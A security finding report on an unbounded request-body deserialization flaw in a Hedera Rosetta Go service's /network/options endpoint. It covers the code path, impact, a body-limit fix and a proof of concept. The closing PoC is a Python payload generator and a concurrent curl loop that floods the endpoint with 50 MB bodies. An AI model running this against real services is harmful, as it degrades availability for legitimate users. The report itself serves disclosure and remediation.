### Title
Unbounded Request Body Deserialization in `NetworkOptions()` Enables Memory-Exhaustion Griefing

### Summary
The `/network/options` endpoint accepts a `NetworkRequest` JSON body with no enforced size cap. The Go HTTP server applies only a time-based `ReadTimeout` (5 s), not a byte-based limit, so any unauthenticated caller can stream a maximally-sized payload within that window. The rosetta-sdk-go controller fully deserializes the body—including the open-ended `Metadata map[string]interface{}` field—into heap memory before `NetworkOptions()` is ever invoked, making the service handler's decision to ignore the parameter irrelevant to the memory cost.

### Finding Description

**Exact code path**

`rosetta/main.go` lines 220–227 configure the `http.Server`:

```go
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,   // 5 s default
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,
}
```

No `http.MaxBytesReader` is applied anywhere in the middleware chain (`MetricsMiddleware → TracingMiddleware → CorsMiddleware → router`). A grep across all `rosetta/**/*.go` files returns zero matches for `MaxBytesReader`, `LimitReader`, or any equivalent body-cap primitive.

The middleware stack (`rosetta/app/middleware/trace.go`, `rosetta/app/middleware/metrics.go`) performs logging and Prometheus instrumentation only; neither wraps `r.Body` with a size limit.

The Traefik-level `inFlightReq` (5 concurrent per IP) and `rateLimit` (10 req/s per host) defined in `charts/hedera-mirror-rosetta/values.yaml` lines 149–166 are gated on `{{ if and .Values.global.middleware .Values.middleware }}` (`charts/hedera-mirror-rosetta/templates/middleware.yaml` line 3). `global.middleware` defaults to `false` (line 95 of `values.yaml`), so this protection is **off by default**.

**Root cause**

`ReadTimeout` is a connection-level deadline, not a byte cap. Go's `net/http` server reads the body lazily on demand; it does not pre-buffer or reject oversized bodies. The rosetta-sdk-go `NetworkAPIController` calls `json.NewDecoder(r.Body).Decode(&networkRequest)` (standard SDK pattern) which allocates heap memory proportional to the payload size. The `Metadata` field is typed `map[string]interface{}`, accepting arbitrarily deep/wide JSON trees.

**Why the `NetworkOptions` handler ignoring the parameter does not help**

The deserialization occurs in the SDK controller *before* `NetworkOptions()` is called. The handler signature `(_ context.Context, _ *rTypes.NetworkRequest)` discards the already-allocated struct, but the allocation has already happened.

### Impact Explanation

An attacker sending the maximum payload deliverable in 5 s (≈ 62 MB on a 100 Mbps link, ≈ 625 MB on a 1 Gbps link) per connection, across multiple concurrent connections, forces proportional heap growth in the Go process. Go's GC cannot reclaim memory faster than it is allocated under sustained load. The result is memory pressure that degrades or crashes the Rosetta service for all legitimate users. Because the endpoint is unauthenticated and stateless, the attack is trivially repeatable. Severity is consistent with the stated scope: griefing / availability degradation with no economic damage to network participants.

### Likelihood Explanation

Preconditions: none. The endpoint is public, requires no credentials, and is reachable on port 5700 (or via the Kubernetes ingress). The attack requires only a fast uplink and a loop sending large JSON bodies. The Traefik mitigations that would limit concurrent requests per IP are disabled by default. Any script kiddie with `curl` or a trivial Python loop can execute this.

### Recommendation

1. **Immediate**: Wrap `r.Body` with `http.MaxBytesReader` in a middleware applied before the router, e.g.:
   ```go
   func BodyLimitMiddleware(maxBytes int64, next http.Handler) http.Handler {
       return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
           r.Body = http.MaxBytesReader(w, r.Body, maxBytes)
           next.ServeHTTP(w, r)
       })
   }
   ```
   A limit of 4–16 KB is more than sufficient for any valid `NetworkRequest`.
2. **Enable Traefik middleware by default** (`global.middleware: true`) so `inFlightReq` and `rateLimit` are active in all deployments.
3. Add an integration test asserting that a request body exceeding the limit returns HTTP 413.

### Proof of Concept

```bash
# Generate a ~50 MB payload in the metadata field
python3 -c "
import json, sys
payload = {
  'network_identifier': {'blockchain': 'Hedera', 'network': 'testnet'},
  'metadata': {'x': 'A' * 50_000_000}
}
sys.stdout.write(json.dumps(payload))
" > /tmp/big_payload.json

# Fire multiple concurrent requests
for i in $(seq 1 20); do
  curl -s -X POST http://<rosetta-host>:5700/network/options \
       -H 'Content-Type: application/json' \
       --data-binary @/tmp/big_payload.json &
done
wait
# Observe RSS of the rosetta process growing; repeat to sustain pressure
```

Each request forces the Go runtime to allocate ≥ 50 MB of heap for the `Metadata` map. Twenty concurrent requests = ≥ 1 GB of transient heap pressure, triggering GC thrashing and latency spikes for legitimate callers.